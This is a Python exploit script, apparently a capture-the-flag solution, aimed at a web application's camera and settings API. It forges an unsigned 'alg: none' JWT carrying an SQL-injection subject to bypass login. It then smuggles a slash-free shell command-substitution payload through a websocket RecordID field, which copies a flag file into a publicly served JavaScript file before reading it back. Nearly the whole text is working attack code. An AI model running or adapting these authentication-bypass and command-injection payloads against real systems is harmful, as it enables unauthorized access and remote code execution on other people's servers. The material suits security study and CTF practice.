import base64
import json
import re
import sys
import time

import requests
import websocket


BASE = sys.argv[1].rstrip("/")


def b64(value):
    raw = json.dumps(value, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


session = requests.Session()
token = b64({"alg": "none"}) + "." + b64(
    {"sub": "' OR 1=1 -- ", "exp": int(time.time()) + 3600}
) + "."

session.post(
    BASE + "/api/system/auth",
    json={
        "authType": "keycloak",
        "keyCloakAccessToken": token,
        "login": "",
        "password": "",
    },
).raise_for_status()

cookie = "; ".join(f"{key}={value}" for key, value in session.cookies.items())


def configure(path):
    response = session.post(
        BASE + "/api/system/settings/video",
        json={
            "videoPreRecordTime": "8",
            "videoRecordTime": "10",
            "videoFrameRate": "2",
            "videoStorageDir": path,
        },
        timeout=15,
    )
    response.raise_for_status()


def connect():
    ws = websocket.create_connection(
        BASE.replace("https://", "wss://") + "/api/ws",
        cookie=cookie,
        timeout=15,
    )
    ws.recv()
    ws.send(json.dumps({"subscribe": "ws_sysserver"}))
    ws.recv()
    return ws


def init_camera(ws):
    ws.send(json.dumps({
        "to": "ws_sysserver",
        "message": {
            "Cmd": "camera_live_init",
            "DeviceID": 1,
            "TemplateID": 1001,
            "PointID": "x",
            "isStream": False,
        },
    }))


def wait_for(ws, statuses):
    while True:
        event = json.loads(ws.recv())
        message = event.get("message") or {}
        if message.get("status") == "camera_image":
            ws.send(json.dumps({
                "to": "ws_sysserver",
                "message": {"Cmd": "camera_ack", "DeviceID": 1},
            }))
        if message.get("status") in statuses:
            return message


root = "${r}"
devnull = f"{root}dev{root}null"
record_id = (
    f"$(r=${{PWD%${{PWD#?}}}};"
    f"f={root}usr{root}share{root}skudik{root}web{root}panel.js;"
    f"cat {root}flag {root}flag.txt 2>{devnull}>>$f;printf x)"
)

assert "/" not in record_id

configure("/var/lib/skudik/archive")
ws = connect()
init_camera(ws)
wait_for(ws, {"camera_ready", "camera_message"})
ws.send(json.dumps({
    "to": "ws_sysserver",
    "message": {"Cmd": "camera_photo", "DeviceID": 1, "RecordID": record_id},
}))
saved = wait_for(ws, {"camera_photo_saved", "camera_message"})
ws.close()

configure(saved["file"])
ws = connect()
init_camera(ws)
wait_for(ws, {"camera_ready", "camera_message"})
ws.send(json.dumps({
    "to": "ws_sysserver",
    "message": {"Cmd": "camera_record", "DeviceID": 1},
}))
wait_for(ws, {"camera_record_started", "camera_message"})
ws.close()

time.sleep(1)
panel = session.get(BASE + "/panel.js", timeout=15).text
print(re.findall(r"kaspersky\{[^}\r\n]+\}", panel, re.I))


